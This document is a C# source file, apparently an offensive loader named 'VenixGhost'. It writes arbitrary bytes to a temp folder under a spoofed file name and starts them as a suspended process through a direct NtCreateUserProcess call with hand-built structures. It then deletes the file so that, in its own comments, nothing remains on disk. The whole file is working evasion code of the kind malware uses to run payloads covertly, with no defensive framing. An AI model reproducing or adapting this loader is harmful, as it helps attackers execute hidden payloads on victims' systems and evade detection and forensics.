using System;
using System.Runtime.InteropServices;
using System.Text;

public static class VenixGhost {
    const uint GENERIC_READ         = 0x80000000;
    const uint GENERIC_WRITE        = 0x40000000;
    const uint FILE_SHARE_ALL       = 0x00000007;
    const uint CREATE_ALWAYS        = 2;
    const uint FILE_ATTRIBUTE_NORMAL     = 0x80;

    // Access masks matching what kernelbase passes to NtCreateUserProcess.
    const uint PROCESS_CREATE_ACCESS = 0x02000000;
    const uint THREAD_CREATE_ACCESS  = 0x02000000;

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
        public UNICODE_STRING(string s) {
            Length = (ushort)(s.Length * 2);
            MaximumLength = (ushort)((s.Length + 1) * 2);
            Buffer = Marshal.StringToHGlobalUni(s);
        }
    }

    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern IntPtr CreateFileW(string name, uint access, uint share,
        IntPtr sec, uint creation, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteFile(IntPtr h, byte[] buf, uint n, out uint written, IntPtr ov);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool FlushFileBuffers(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
    public static extern uint GetTempPathW(uint len, StringBuilder buf);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool CreateDirectoryW(string path, IntPtr sec);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool RemoveDirectoryW(string path);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetEnvironmentStringsW();
    [DllImport("kernel32.dll")]
    public static extern uint GetProcessId(IntPtr p);

    [DllImport("ntdll.dll")]
    public static extern int RtlCreateProcessParametersEx(out IntPtr pp,
        ref UNICODE_STRING imagePath, IntPtr dllPath, ref UNICODE_STRING currentDir,
        ref UNICODE_STRING commandLine, IntPtr env, IntPtr wt, IntPtr di, IntPtr si,
        IntPtr rd, uint flags);
    [DllImport("ntdll.dll")]
    public static extern int NtCreateUserProcess(out IntPtr proc, out IntPtr thread,
        uint pa, uint ta, IntPtr poa, IntPtr toa, uint pf, uint tf,
        IntPtr pp, IntPtr ci, IntPtr al);
    [DllImport("ntdll.dll")]
    public static extern int NtResumeThread(IntPtr thread, out uint prev);
    [DllImport("ntdll.dll")]
    public static extern int RtlDestroyProcessParameters(IntPtr pp);

    // RTL_USER_PROCESS_PARAMETERS built the way CreateProcessInternalW builds it:
    // RtlCreateProcessParametersEx with 11 args, Flags=1 (NORMALIZED). imagePath is
    // the WIN32 form; the attrlist carries the \??\ name used for the image open.
    static IntPtr BuildProcessParameters(string imagePath, string cmdLine, string cwd) {
        var img = new UNICODE_STRING(imagePath);
        var cmd = new UNICODE_STRING(cmdLine);
        var cur = new UNICODE_STRING(cwd);
        IntPtr pp = IntPtr.Zero;
        int st = RtlCreateProcessParametersEx(out pp, ref img, IntPtr.Zero, ref cur, ref cmd,
            GetEnvironmentStringsW(), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
        if (st != 0) return IntPtr.Zero;
        return pp;
    }

    // 5-entry attribute list, byte-exact to the kernelbase trace on Win11 24H2.
    // e0 = PS_ATTRIBUTE_IMAGE_NAME (raw \??\ wide path, size WITHOUT NUL)
    // e1 = 0x10003 zero16, e2 = 0x00006 zero64, e3 = 0x2000A {1,3}, e4 = 0x6001A inline 1
    static IntPtr MakeAttrList(string ntPath) {
        IntPtr z16 = Marshal.AllocHGlobal(0x10);
        IntPtr z64 = Marshal.AllocHGlobal(0x40);
        for (int i = 0; i < 0x50; i++) {
            if (i < 0x10) Marshal.WriteByte(z16, i, 0);
            if (i < 0x40) Marshal.WriteByte(z64, i, 0);
        }
        IntPtr n34 = Marshal.AllocHGlobal(0x10);
        Marshal.WriteInt64(n34, 0, 1);
        Marshal.WriteInt64(n34, 8, 3);

        IntPtr wname = Marshal.StringToHGlobalUni(ntPath);
        long len = (long)ntPath.Length * 2;                 // NO null terminator

        IntPtr al = Marshal.AllocHGlobal(8 + 5 * 0x20);
        Marshal.WriteInt64(al, 0, 8 + 5L * 0x20);
        WriteEntry(al, 0x08, 0x20005, (ulong)len,   (ulong)wname.ToInt64());
        WriteEntry(al, 0x28, 0x10003, 0x10,         (ulong)z16.ToInt64());
        WriteEntry(al, 0x48, 0x00006, 0x40,         (ulong)z64.ToInt64());
        WriteEntry(al, 0x68, 0x2000A, 8,            (ulong)n34.ToInt64());
        WriteEntry(al, 0x88, 0x6001A, 1,            1);     // inline value
        return al;
    }
    static void WriteEntry(IntPtr al, long off, ulong attr, ulong size, ulong val) {
        long b = al.ToInt64() + off;
        Marshal.WriteInt64((IntPtr)b,      0, (long)attr);
        Marshal.WriteInt64((IntPtr)(b+8),  0, (long)size);
        Marshal.WriteInt64((IntPtr)(b+16), 0, (long)val);
        Marshal.WriteInt64((IntPtr)(b+24), 0, 0);
    }

    // PS_CREATE_INFO - byte-exact kernelbase shape: Size=0x58, InitFlags=0,
    // qword@0x08=0, @0x10=0x20000003, @0x14=0x81, rest zero.
    static IntPtr MakeCreateInfo() {
        IntPtr ci = Marshal.AllocHGlobal(0x58);
        for (int i = 0; i < 0x58; i++) Marshal.WriteByte(ci, i, 0);
        Marshal.WriteInt64(ci, 0, 0x58);
        Marshal.WriteInt32(ci, 0x10, unchecked((int)0x20000003));
        Marshal.WriteInt32(ci, 0x14, 0x81);
        return ci;
    }

    // The kernel refuses to open an image (SEC_IMAGE) whose file has an open
    // write/delete handle (STATUS_IMAGE_ALREADY_LOADED). So the staging file is
    // written AND closed first; NtCreateUserProcess re-opens it by name cleanly,
    // then we unlink the copy immediately after the process is live.
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool DeleteFileW(string name);

    public static int RunGhost(byte[] data, string spoofName) {
        StringBuilder tmp = new StringBuilder(260);
        GetTempPathW(260, tmp);
        string rnd = DateTime.UtcNow.Ticks.ToString("X8") + System.Diagnostics.Process.GetCurrentProcess().Id.ToString("X8");
        string dir = tmp.ToString().TrimEnd('\\') + "\\" + rnd;
        string path = dir + "\\" + spoofName;
        if (!CreateDirectoryW(dir, IntPtr.Zero)) return -1;

        IntPtr hFile = CreateFileW(path, GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_ALL, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        if (hFile.ToInt64() == -1) { RemoveDirectoryW(dir); return -2; }

        uint written = 0;
        int off = 0;
        while (off < data.Length) {
            int chunk = Math.Min(1 << 20, data.Length - off);
            byte[] slice = new byte[chunk];
            Array.Copy(data, off, slice, 0, chunk);
            if (!WriteFile(hFile, slice, (uint)chunk, out written, IntPtr.Zero) || written != (uint)chunk) {
                CloseHandle(hFile); DeleteFileW(path); RemoveDirectoryW(dir); return -3;
            }
            off += chunk;
        }
        FlushFileBuffers(hFile);
        CloseHandle(hFile);      // no open handle while the image section is made

        string cwd = dir;
        string cmd = "\"" + path + "\"";
        string nt = @"\??\" + path;

        IntPtr pp = BuildProcessParameters(path, cmd, cwd);
        if (pp == IntPtr.Zero) { DeleteFileW(path); RemoveDirectoryW(dir); return -11; }

        IntPtr al = MakeAttrList(nt);
        IntPtr ci = MakeCreateInfo();
        IntPtr hp = IntPtr.Zero, ht = IntPtr.Zero;
        int st = NtCreateUserProcess(out hp, out ht, PROCESS_CREATE_ACCESS, THREAD_CREATE_ACCESS,
            IntPtr.Zero, IntPtr.Zero, 0, 1 /*tf=1 -> suspended*/, pp, ci, al);
        RtlDestroyProcessParameters(pp);

        if (st != 0) {
            DeleteFileW(path); RemoveDirectoryW(dir); return st;
        }

        // Process is live and holds its own image section; the staging copy can
        // vanish now - nothing on disk survives the launch.
        DeleteFileW(path);
        RemoveDirectoryW(dir);

        uint prev = 0;
        st = NtResumeThread(ht, out prev);
        CloseHandle(ht);
        CloseHandle(hp);
        return st;
    }
}
